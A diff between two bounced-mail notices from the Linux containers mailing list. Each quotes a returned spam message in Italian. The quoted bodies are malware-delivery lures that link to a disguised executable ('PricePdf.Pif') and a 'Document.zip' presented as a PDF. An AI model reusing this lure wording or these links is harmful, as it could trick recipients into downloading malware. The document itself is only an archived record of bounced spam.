@@ -1,9 +1,10 @@
-From: <Mailer-Daemon-YE7568uCh0io6xBqStlHV0R9zWBbDsu9@public.gmane.org> (Mail Delivery System)
-Subject: Undelivered Mail Returned to Sender
-Date: Thu, 10 May 2012 21:08:13 +0200
-Message-ID: <20120510192320.A9396280@mail.linuxfoundation.org>
+From: <postmaster-h3WbwRhx77M@public.gmane.org>
+Subject: DELIVERY FAILURE: User e096f658 (e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org) not listed in
+	Domino Directory
+Date: Thu, 10 May 2012 14:10:58 -0700
+Message-ID: <OF57601609.5A0B2303-ONC12579FA.00745DF2-C12579FA.00745EB7@eni.it>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============5812620857045864175=="
+Content-Type: multipart/mixed; boundary="===============1202633036124881715=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -17,85 +18,88 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-This is a MIME-encapsulated message.
-
---===============5812620857045864175==
+--===============1202633036124881715==
 Content-Type: multipart/report; report-type=delivery-status;
- boundary="XEytBVShee/CeHZCApbf9UFSxQHkun9RmNLP1Q=="
+	boundary="==IFJRGLKFGIR40328142UHRUHIHD"
 
-This is a MIME-encapsulated message.
+--==IFJRGLKFGIR40328142UHRUHIHD
+Content-Type: text/plain; charset="UTF-8"
+Content-Transfer-Encoding: base64
 
---XEytBVShee/CeHZCApbf9UFSxQHkun9RmNLP1Q==
-Content-Description: Notification
-Content-Type: text/plain
+WW91ciBtZXNzYWdlDQoNCiAgU3ViamVjdDogUmljaGllc3RhDQoNCndhcyBub3QgZGVsaXZlcmVk
+IHRvOg0KDQogIGUwOTZmNjU4QG5hb2MuYWdpcC5pdA0KDQpiZWNhdXNlOg0KDQogIFVzZXIgZTA5
+NmY2NTggKGUwOTZmNjU4QG5hb2MuYWdpcC5pdCkgbm90IGxpc3RlZCBpbiBEb21pbm8gRGlyZWN0
+b3J5DQoNCg==
 
-I'm sorry to have to inform you that your message could not
-be delivered to one or more recipients. It's attached below.
-
-For further assistance, please send mail to <postmaster>
-
-If you do so, please include this problem report. You can
-delete your own text from the attached returned message.
-
-<46eff148.7060806-czlgayvd9obzM4FeTNmR7w@public.gmane.org>: 550 5.1.1 <46eff148.7060806-czlgayvd9obzM4FeTNmR7w@public.gmane.org> User unknown; rejecting
-
-
---XEytBVShee/CeHZCApbf9UFSxQHkun9RmNLP1Q==
-Content-Description: Delivery report
+--==IFJRGLKFGIR40328142UHRUHIHD
 Content-Type: message/delivery-status
 
-X-Symantec-Messaging-Gateway-Queue-ID: 99/5E-03406-7121CAF4
-X-Symantec-Messaging-Gateway-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-Reporting-MTA: dns; sms.die.uniroma1.it
-Arrival-Date: Thu, 10 May 2012 21:08:13 +0200
+Reporting-MTA: dns;ensv01xl.eni.pri
 
-Final-Recipient: rfc822; 46eff148.7060806-czlgayvd9obzM4FeTNmR7w@public.gmane.org
-Status: 5.1.1
+Original-Recipient: rfc822;e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org
+Final-Recipient: rfc822;e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org
 Action: failed
-Last-Attempt-Date: Thu, 10 May 2012 21:08:13 +0200
-Diagnostic-Code: smtp; 550 5.1.1 <46eff148.7060806-czlgayvd9obzM4FeTNmR7w@public.gmane.org> User unknown; rejecting
+Status: 5.1.1
+Diagnostic-Code: X-Notes; User e096f658 (e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org) not lis
+ ted in Domino Directory
 
---XEytBVShee/CeHZCApbf9UFSxQHkun9RmNLP1Q==
-Content-Description: Undelivered Message
+--==IFJRGLKFGIR40328142UHRUHIHD
 Content-Type: message/rfc822
 
-X-AuditID: c0a87803-b7f546d000000d4e-8c-4fac12167256
-Received: from sitenow.co.nz (Unknown_Domain [208.99.211.118])
-	by sms.die.uniroma1.it (Symantec Messaging Gateway) with SMTP id 89.5E.03406.6121CAF4; Thu, 10 May 2012 21:08:07 +0200 (CEST)
-Received: from [192.168.137.100] by sitenow.co.nz id NtxQPpCrRH9c; Thu, 10 May 2012 12:08:07 -0700
-Message-ID: <00c101cd2ee0$3926ab80$6489a8c0-AH9seTFQ2VlBWQWeTLFoew@public.gmane.org>
+Received: from ensv01xl.eni.pri ([127.0.0.1])
+          by ensv01xl.eni.pri (Lotus Domino Release 7.0.3)
+          with ESMTP id 2012051023110226-38780 ;
+          Thu, 10 May 2012 23:11:02 +0200
+Received: from enbo0106.enirf.res.prirf ([10.129.52.123]) by ensv01xl.eni.pri with InterScan Messaging Security Suite; Thu, 10 May 2012 23:11:01 +0200
+Received: from ensv0047.eni.pri (10.130.1.11) by enbo0106.enirf.res.prirf
+ (10.129.52.123) with Microsoft SMTP Server id 8.3.106.1; Thu, 10 May 2012
+ 23:11:01 +0200
+Received: from relayIN-2-to-AS.eni.it ([172.31.254.171]) by ensv0047 with
+ trend_isnt_name_B; Thu, 10 May 2012 23:11:00 +0200
+Received: from mr-5a.inet.it (mr-5a.inet.it [213.92.5.19])	by
+ relayIN-2-to-AS.eni.it (Postfix) with ESMTP id DD93A4C23A6	for
+ <e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org>; Thu, 10 May 2012 23:10:55 +0200 (CEST)
+Received: from ::ffff:172.30.155.150 ([::ffff:172.30.155.150]) by
+ mr-5a.inet.it via I-SMTP-5.6.2-562	id ::ffff:172.30.155.150+tS7tGIaUjO; Thu,
+ 10 May 2012 23:11:00 +0200
+Received: from unknown (HELO sitenow.co.nz) ([208.99.211.118])  by
+ gw.mail.inet.it with ESMTP; 10 May 2012 23:10:58 +0200
+Received: from [208.99.211.118] ([[208.99.211.118:49735]) by sitenow.co.nz
+ (envelope-from <update+KLPyL3Yt0jr-AH9seTFQ2VlBWQWeTLFoew@public.gmane.org>) (ecelerity 2.2.2.45
+ r(34222M)) with ECSTREAM id Jx/06-07174-22618531; Thu, 10 May 2012 14:10:58
+ -0700
+X-IronPort-Anti-Spam-Filtered: true
+X-IronPort-Anti-Spam-Result: AtE8AKItrE/QY9N2W2dsb2JhbABEBoMhgk+tCAOBHhgXCAwHPTgBAYF0EQ8Bbg0CJgJFGhsah2wLmgSDJgGDJIdzkn6BL4pRggmCDoEYBIhkjiqEZCKFIIQng2s
+X-IronPort-AV: E=Sophos;i="4.75,567,1330902000";
+   d="scan'208";a="813739572"
+Reply-To: j8Emh8nQ02cwyg <update+0jMBWm2n0fup-AH9seTFQ2VlBWQWeTLFoew@public.gmane.org>
+Date: Thu, 10 May 2012 14:10:58 -0700
+To: <e096f658-K03YZeKAAS1UgOyQZvm8Rg@public.gmane.org>
 From: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <46eff148.7060806-czlgayvd9obzM4FeTNmR7w@public.gmane.org>
-Subject: Re: Indirizzo di consegna
-Date: Thu, 10 May 2012 12:08:07 -0700
+Subject: Richiesta
 MIME-Version: 1.0
-Content-Type: text/plain;charset=utf-8
-X-Brightmail-Tracker: H4sIAAAAAAAAA+NgFtrBIsWRWlGSWpSXmKPExsVyIflyma640Bp/g1srNCxOLWtld2D0eDa5
-	nSmAMYrLJiU1J7MstUjfLoErY/fmKYwFbUwVk8+8Y29gvMPYxcjJISFgIjFp3idWCFtM4sK9
-	9WxdjFwcQgL7GCVerHkLlhASSJL4t3wWM4jNK2Alce7JLHYQm01AV+LZzNlgtoiAmsS0nkts
-	ILawgJLE2uW3WboY2TlYBFQlzuRAdApKnJz5hAXEZgaqPrpnDxuELS/RvHU28wRGnllIymYh
-	KZuFpGwBI/MqRoni3GK93MTMHL2UzFS90rzMovzcREO9zJJNjMAgObCignkH44trMocYBTgY
-	lXh4Od+u9hdiTSwrrsw9xCjJwaQkyisosMZfiC8pP6UyI7E4I76oNCe1+BCjBAezkgjvnOlA
-	5bwpiZVVqUX5MCkZDg4lCd4QkDbBotT01Iq0zBxgLMCkmTg4Qdp5gNp9QWp4iwsSc4sz0yHy
-	pxh1OaYeXHaNUYglLz8vVUqctxCkSACkKKM0D24OKELr////f4lRVkqYl5GBgUGIpyC1KDez
-	BCEPivBXjOJAjwnzJoNM4cnMK4Hb9AroCCagI6YdXglyREkiQkqqgdH3wa9vJ7ce/KZ0UCHk
-	j0n1SnfuH1ssyn/s7U9IVLu0tezmdWXfixxbNwjMeST8hOfXNLacfE/JI9JrDt82Vmrw2j19
-	u8cB92d7teU/Xep0K8qM449ffVD/+yefa8cX8JW1Ldv30vrQOpOrWxXDnh+SCjrsIyKuN+tU
-	XK1z6/05pirzFidW+a9RYinOSDTUYi4qTgQAisWDa8sCAAA=
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-MIMETrack: Itemize by SMTP Server on ENSV01XL/SRV/ENIEXT/IT(Release 7.0.3|September 26, 2007) at
+ 10/05/2012 23.11.02,
+	Serialize by Router on ENSV01XL/SRV/ENIEXT/IT(Release 7.0.3|September 26, 2007) at
+ 10/05/2012 23.11.04
+Message-ID: <OF57601609.5A0B2303-ONC12579FA.00745DF2-C12579FA.00745EB7-hQ4AdYEyvVk@public.gmane.org>
+Content-Type: text/plain; charset="utf-8"
 Content-Transfer-Encoding: quoted-printable
 
 
 
-Buon giorno a voi non e possibile contattare telefonicamente per chiarire=
- che la
-informazioni e indirizzo di consegna. Scarica le informazioni in
-http://rf-hydraulics.gr/aggiornare/PricePdf.Pif
-Controllare tutto e ci chiamano Tel./Fax.: (040) 492 71 92=20
+
+La tua richiesta verra fatta!
+Ci scusiamo per il ritardo della risposta.
+I dettagli possono essere trovati nel file Pdf qui:
+http://ravipahwa.com/aggiornare/Document.zip
 
 
---XEytBVShee/CeHZCApbf9UFSxQHkun9RmNLP1Q==--
 
---===============5812620857045864175==
+--==IFJRGLKFGIR40328142UHRUHIHD--
+
+--===============1202633036124881715==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -105,4 +109,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============5812620857045864175==--
+--===============1202633036124881715==--
